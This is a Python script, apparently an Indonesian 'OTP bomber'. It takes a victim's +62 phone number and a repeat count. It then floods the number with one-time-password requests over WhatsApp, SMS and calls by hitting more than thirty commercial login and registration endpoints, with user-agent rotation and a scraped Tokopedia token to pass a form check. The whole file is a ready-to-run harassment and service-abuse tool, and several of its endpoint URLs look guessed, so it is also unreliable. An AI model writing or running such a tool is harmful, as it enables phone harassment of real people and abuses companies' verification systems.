import requests, json, re, sys, random, time
from rich.console import Console
from rich.panel import Panel
from rich.progress import track

console = Console()
H2 = "[#00ff00]"
P2 = "[white]"
color_panel = "bold red"

user_agents = [
    "Mozilla/5.0 (Linux; Android 13; Infinix X6826) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
]

def cetak(msg): console.print(msg)

def safe_post(url, headers, data=None, json_=None):
    try:
        if json_:
            return requests.post(url, headers=headers, json=json_)
        return requests.post(url, headers=headers, data=data)
    except:
        return None

def spam(nomor):
    ua = random.choice(user_agents)
    headers = {'user-agent': ua, 'content-type': 'application/json'}

    # Daftar endpoint WA/SMS/Telepon
    endpoints = [
        ("https://api-v2.bukuwarung.com/api/v2/auth/otp/send", {"action":"LOGIN_OTP","countryCode":"+62","deviceId":"xxx","method":"WA","phone":nomor,"clientId":"...","clientSecret":"..."}),
        ("https://accounts.tokopedia.com/otp/c/ajax/request-wa", None),  # ditangani khusus
        ("https://www.carsome.id/website/login/sendSMS", {"username": nomor, "optType": 1}),
        ("https://api.bibit.id/auth/register/phone", {"code":"62","phone": nomor,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"}),
        ("https://evermos.com/api/register/phone-registration", {"phone": "62"+nomor}),
        ("https://wapi.ruparupa.com/auth/generate-otp", {"phone":"0"+nomor,"action":"register","channel":"chat"}),
        ("https://api-v2.segari.id/v1/otps/generate", {"phoneNumber": nomor}),
        ("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", {"otp_request":{"mobile_number":"0"+nomor,"mobile_country_code":"+62"}}),
        ("https://api.pintarnya.com/api/pk/auth/register/mobile", {"mobile":"+62"+nomor}),
        ("https://api.duniagames.co.id/api/user/api/v2/user/send-otp", {"phoneNumber":"+62"+nomor,"userName":"0"+nomor}),
        ("https://auth.tix.id/v1/customer/otp/whatsapp", {"mobile": nomor}),
        ("https://api.blibli.com/v1/register/otp-request", {"phoneNumber": nomor, "channelType": "whatsapp"}),
        ("https://api.yummy.app/api/v1/auth/otp", {"phone": "+62"+nomor}),
        ("https://api.kredivo.com/v1/phone_verifications", {"phone_number":nomor}),
        ("https://api.kitahebat.co.id/api/v1/auth/otp", {"phone_number": "+62"+nomor}),
        ("https://api.jaktour.com/v2/otp", {"phone": "+62"+nomor}),
        ("https://api.go-jek.com/gojek/otp", {"phone_number": "+62"+nomor}),
        ("https://api.grab.com/v2/grabid/verify", {"msisdn": nomor, "method": "whatsapp"}),
        ("https://www.gojek.com/api/auth/otp", {"msisdn": nomor, "via": "sms"}),
        ("https://api.lazada.co.id/otp/whatsapp", {"msisdn": nomor}),
        ("https://api.shopee.co.id/v2/auth/otp", {"phone": nomor, "method": "WHATSAPP"}),
        ("https://api.olx.co.id/auth/otp", {"phone": nomor}),
        ("https://api.tokodigital.id/v1/otp/whatsapp", {"phone": "+62"+nomor}),
        ("https://api.hargapedia.com/v1/otp/send", {"phone": nomor, "channel": "WA"}),
        ("https://api.duitku.com/otp", {"phone": nomor}),
        ("https://api.likeit.co.id/v1/otp", {"phone": nomor}),
        ("https://api.alfaclick.com/otp", {"phone_number": nomor}),
        ("https://api.indodax.com/api/v1/auth/otp", {"phone": nomor}),
        ("https://api.ibank.xyz/otp", {"phone": nomor}),
        ("https://api.spay.id/v1/otp", {"phone": nomor}),
        ("https://api.kontakin.com/otp", {"msisdn": nomor}),
        ("https://api.keranjang.id/v1/otp", {"phone": nomor}),
        ("https://api.mylapak.id/otp", {"phone": nomor}),
        ("https://api.bonus.id/otp", {"phone": nomor})
    ]

    # Kirim spam ke semua endpoint
    for url, payload in endpoints:
        if "tokopedia.com" in url:
            try:
                site = requests.get(f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0{nomor}", headers=headers, timeout=10).text
                m = re.search(r'id="Token" value="([^"]+)"', site)
                if m:
                    safe_post(url, headers, data={'otp_type':'116','msisdn':'0'+nomor,'tk':m.group(1)})
            except:
                pass
        else:
            safe_post(url, headers, json_=payload)
        time.sleep(0.5)

def main():
    try:
        console.print(Panel(f"{H2}Spam Multi-Kanal Indonesia 30+ API Aktif", width=80, padding=(0,6), style=color_panel))
        nomor = console.input(f"{H2}• {P2}Masukkan No +62: ").strip().replace("+62","").replace(" ","").replace("-","")
        jumlah = int(console.input(f"{H2}• {P2}Jumlah Spam: "))
        for _ in track(range(jumlah), description=f'{H2}Mengirim spam...'):
            spam(nomor)
        cetak(Panel(f"✅ Selesai spam ke +62{nomor}", width=80, padding=(0,2), style="bold white"))
    except KeyboardInterrupt:
        sys.exit("Dihentikan user")
    except Exception as e:
        console.print(Panel(f"[red]Error: {e}", width=80))

if __name__ == "__main__":
    main()
